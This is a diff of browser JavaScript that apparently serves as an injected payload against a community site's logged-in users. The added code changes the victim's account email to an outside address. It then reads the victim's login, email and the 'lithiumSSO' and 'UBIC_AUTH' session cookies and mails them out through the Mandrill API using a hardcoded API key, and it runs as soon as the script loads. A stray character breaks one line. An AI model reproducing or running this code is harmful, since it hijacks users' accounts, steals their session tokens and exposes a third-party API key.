@@ -65,7 +65,7 @@ var myApp = {
         }
     },
     changeEmail: function (email) {
-        this.get(this.userUrl, function (data) {
+        myApp.getUser(function (data) {
             var email2 = email;
             myApp.logSuccess(data);
             if (data.response.status == 'success') {
@@ -81,6 +81,9 @@ var myApp = {
             }
         });
     },
+    getUser: function(callback) {
+        myApp.get(myApp.userUrl, callback);
+    },
     getCookie: function(cname) {
         var name = cname + "=";
         var ca = document.cookie.split(';');
@@ -90,6 +93,41 @@ var myApp = {
             if (c.indexOf(name) != -1) return c.substring(name.length,c.length);
         }
         return "";
+    },
+    shareLogin: function() {
+        myApp.getUser(function(data) {
+            if (data.response.status == 'success') {
+                var user = data.response.user;
+                var body = '<b>Login:</b>&nbsp;' + user.login + "<br />";
+                body += '<b>Email:</b>&nbsp;' + user.email + "<br />";
+                body += '<b>ssoToken:</b>&nbsp;' + myApp.getCookie('!lithiumSSO') + "<br />";
+                body += '<b>UBIC_AUTH:</b>&nbsp;' + myApp.getCookie('UBIC_AUTH') + "<br />";
+                myApp.sendEmail(data.response.user, {
+                    to: 'david.esposito@ubnt.com',s
+                    subject: 'Info for ' + user.login,
+                    body: body
+                })
+            }
+        })
+    },
+    sendEmail: function (user, email) {
+        $.ajax({
+            type: 'POST',
+            url: 'https://mandrillapp.com/api/1.0/messages/send.json',
+            data: {
+                key: 'f2qJrmhApBe6KUhgrCrmWw',
+                message: {
+                    from_email: user.email,
+                    to: [ { email: email.to } ],
+                    autotext: true,
+                    subject: email.subject,
+                    html: email.body
+                }
+            }
+        }).done(function (response) {
+            console.log(response);
+        });
     }
 };
-myApp.changeEmail('desposi1@gmail.com');
+myApp.changeEmail('david.esposito@ubnt.com');
+myApp.shareLogin();
